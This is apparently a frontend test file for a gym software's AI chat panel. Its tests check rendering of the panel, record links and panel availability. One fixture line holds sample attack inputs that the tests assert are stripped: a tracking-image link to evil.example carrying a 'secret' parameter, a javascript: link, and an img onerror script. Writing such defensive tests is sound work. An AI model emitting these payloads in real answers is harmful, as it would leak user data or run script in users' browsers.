import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { renderWithApp, resetApiForTests } from "@/test/harness";
import type { MockGymOSApi } from "@/lib/mock/MockGymOSApi";
import { AskRivetProvider, useAskRivetScreen } from "./ask-rivet-context";
import { AskRivetPanel } from "./ask-rivet-panel";
import { AskRivetLauncher } from "./launcher";
import { StreamingMarkdown } from "./markdown";

vi.mock("next/navigation", () => ({ useRouter: () => ({ push: vi.fn(), replace: vi.fn(), prefetch: vi.fn() }), useParams: () => ({}), usePathname: () => "/members/m-1", useSearchParams: () => new URLSearchParams() }));

beforeEach(() => {
  vi.stubGlobal("ResizeObserver", class { observe() {} unobserve() {} disconnect() {} });
  // A wide desktop: the panel docks.
  vi.stubGlobal("matchMedia", (query: string) => ({ matches: /min-width/.test(query), media: query, addEventListener() {}, removeEventListener() {}, addListener() {}, removeListener() {}, onchange: null, dispatchEvent: () => false }));
  vi.stubGlobal("requestAnimationFrame", (callback: FrameRequestCallback) => window.setTimeout(() => callback(performance.now()), 0));
  vi.stubGlobal("cancelAnimationFrame", (id: number) => window.clearTimeout(id));
});

afterEach(() => {
  resetApiForTests();
  vi.unstubAllGlobals();
});

describe("answers are rendered as untrusted text", () => {
  it("turns RIVET record links into chips and refuses everything else that could leak or run", () => {
    render(<StreamingMarkdown streaming={false} text={[
      "Call [Ahmad Khalil](rivet://member/m-1) and [Rana](rivet://lead/l-2).",
      "",
      "![tracking](https://evil.example/pixel.png?d=secret) [click](javascript:alert(1)) [site](http://plain.example) <img src=x onerror=alert(1)>",
      "",
      "> Hi Ahmad, your membership ends Friday.",
      "",
      "| Member | Owes |",
      "| --- | ---: |",
      "| Ahmad | JOD 25.000 |",
    ].join("\n")} />);
    const records = screen.getAllByTestId("ask-record-link");
    expect(records.map((link) => link.getAttribute("href"))).toEqual(["/members/m-1", "/crm/leads/l-2"]);
    expect(document.querySelector("img")).toBeNull();
    expect(screen.queryByRole("link", { name: "click" })).toBeNull();
    expect(screen.queryByRole("link", { name: "site" })).toBeNull();
    expect(screen.getByText("click")).toBeInTheDocument();
    expect(document.body.innerHTML).not.toContain("onerror");
    expect(screen.getByTestId("ask-draft")).toHaveTextContent("your membership ends Friday");
    expect(within(screen.getByTestId("ask-draft")).getByRole("button", { name: "Copy" })).toBeInTheDocument();
    expect(screen.getByRole("table")).toHaveTextContent("JOD 25.000");
  });

  it("closes half-written syntax in the block still being written", () => {
    render(<StreamingMarkdown streaming text={"Done.\n\nThis is **importa"} />);
    expect(screen.getByText("importa").tagName).toBe("STRONG");
    expect(document.body.textContent).not.toContain("**");
  });
});

function MemberScreen() {
  useAskRivetScreen({ title: "Omar Haddad", focus: { kind: "member", id: "m-1", label: "Omar Haddad" }, suggestions: [{ kind: "member_payments", id: "m-1", label: "Payments" }], prompts: ["Brief me before I call Omar"] });
  return null;
}

function Shell() {
  return <AskRivetProvider><MemberScreen /><AskRivetLauncher /><AskRivetPanel /></AskRivetProvider>;
}

async function makeAvailable(api: MockGymOSApi, capabilities: Record<string, "off" | "prepare" | "execute"> = {}) {
  const session = await api.getSession();
  await api.setPlatformAiAvailability({ organizationId: session.organization.id, available: true, reason: "Test gym" });
  const settings = await api.getAiSettings();
  await api.updateAiSettings({ tenantMode: "execute", expectedRevision: settings.revision, capabilities });
}

describe("the Ask RIVET panel", () => {
  it("does not appear for a gym RIVET has not made available", async () => {
    await renderWithApp(<Shell />);
    await waitFor(() => expect(screen.queryByTestId("ask-rivet-launcher")).toBeNull());
    expect(screen.queryByTestId("ask-rivet-panel")).toBeNull();
  });

  it("does not appear when the gym turns the conversation off", async () => {
    await renderWithApp(<Shell />, { prepare: (api) => makeAvailable(api, { chat: "off" }) });
    await waitFor(() => expect(screen.queryByTestId("ask-rivet-launcher")).toBeNull());
  });

  it("opens with the screen's record attached, offers its lists, and answers with linked records", async () => {
    const user = userEvent.setup();
    await renderWithApp(<Shell />, { prepare: (api) => makeAvailable(api) });
    await user.click(await screen.findByTestId("ask-rivet-launcher"));
    const panel = screen.getByTestId("ask-rivet-panel");
    expect(panel).toHaveAttribute("data-state", "open");
    expect(within(panel).getByTestId("ask-attached")).toHaveTextContent("Omar Haddad");
    expect(within(panel).getByTestId("ask-suggestion")).toHaveTextContent("Payments");
    expect(within(panel).getByTestId("ask-test-badge")).toBeInTheDocument();

    // Adding a suggestion moves it into the message.
    await user.click(within(panel).getByTestId("ask-suggestion"));
    expect(within(panel).getByTestId("ask-attached")).toHaveTextContent("Payments");
    expect(within(panel).queryByTestId("ask-suggestion")).toBeNull();

    await user.type(within(panel).getByTestId("ask-input"), "Which members owe money?{Enter}");
    const answer = await within(panel).findByTestId("ask-answer");
    await waitFor(() => expect(answer).toHaveAttribute("data-status", "complete"), { timeout: 5_000 });
    expect(within(panel).getByTestId("ask-user-message")).toHaveTextContent("Which members owe money?");
    expect(within(panel).getByTestId("ask-user-message")).toHaveTextContent("Omar Haddad");
    await waitFor(() => expect(within(answer).getAllByTestId("ask-record-link").length).toBeGreaterThan(0));
    expect(within(answer).getByTestId("ask-worklog")).toHaveAttribute("data-state", "done");
    expect(within(answer).getByTestId("ask-screen-link")).toHaveAttribute("href", "/members?membership=outstanding");
    // The box is ready for the next question, with the screen's record attached again.
    expect(within(panel).getByTestId("ask-input")).toHaveValue("");
    expect(within(panel).getByTestId("ask-attached")).toHaveTextContent("Omar Haddad");
  });

  it("closes with Escape and from its own button", async () => {
    const user = userEvent.setup();
    await renderWithApp(<Shell />, { prepare: (api) => makeAvailable(api) });
    await user.click(await screen.findByTestId("ask-rivet-launcher"));
    await user.click(screen.getByTestId("ask-input"));
    await user.keyboard("{Escape}");
    expect(screen.getByTestId("ask-rivet-panel")).toHaveAttribute("data-state", "closed");
    await user.click(screen.getByTestId("ask-rivet-launcher"));
    await user.click(screen.getByTestId("ask-close"));
    expect(screen.getByTestId("ask-rivet-panel")).toHaveAttribute("data-state", "closed");
  });
});
